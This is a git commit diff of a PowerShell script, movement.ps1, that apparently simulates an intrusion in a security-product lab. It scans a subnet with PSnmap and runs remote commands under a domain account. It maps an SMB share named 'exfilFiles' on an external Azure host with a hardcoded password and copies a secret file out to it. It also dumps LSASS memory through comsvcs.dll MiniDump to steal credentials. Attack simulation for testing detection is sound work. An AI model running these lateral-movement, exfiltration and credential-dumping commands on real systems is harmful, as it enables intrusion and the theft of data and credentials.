91214db85ac35b6c721ff2d306ae1ac2dad35ef4
bassmandan <daniel@thehardingfamily.org.uk>
2024-12-13 13:20:27 +0000

    Update movement.ps1

--- movement.ps1
+++ movement.ps1
@@ -20,21 +20,17 @@ Install-Module -Name PSnmap -Scope CurrentUser -Force
 # Run NMap scan on firewalled subnet
 Invoke-PSnmap -Cn 10.200.200.0/24 -ScanOnPingFail -Port 443, 3389, 22, 5985, 5986 -Dns -PortConnectTimeoutMs 1000 -AddService
 
-# Connect to remote device
-Enter-PSSession 10.200.200.70 -Credential securex.local\david.altass
+# Print hostname of remote device
+Invoke-Command -ComputerName 10.200.200.70 -Credential securex.local\david.altass -ScriptBlock {$env:computername}
 
-# Print hostname
-$env:computername
+
 
 # Exfiltrate file
 # Create new file share link
-New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\exfilFiles' -UserName 'exfil' -Password 'C1sco12345' -LocalPath 'Z:'
+Invoke-Command -ComputerName 10.200.200.70 -Credential securex.local\david.altass -ScriptBlock {New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\exfilFiles' -UserName 'exfil' -Password 'C1sco12345' -LocalPath 'Z:'}
 # Copy temp file to remote share
-copy 'C:\Temp\secret-data.txt' 'Z:\'
-Remove-SmbMapping -LocalPath 'Z:' -Force
-
-# Exit remote device
-Exit-PSSession
+Invoke-Command -ComputerName 10.200.200.70 -Credential securex.local\david.altass -ScriptBlock {copy 'C:\Temp\secret-data.txt' 'Z:\'}
+Invoke-Command -ComputerName 10.200.200.70 -Credential securex.local\david.altass -ScriptBlock {Remove-SmbMapping -LocalPath 'Z:' -Force}
 
 # Attempt credential theft
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\Windows\Temp\lsass.dmp full
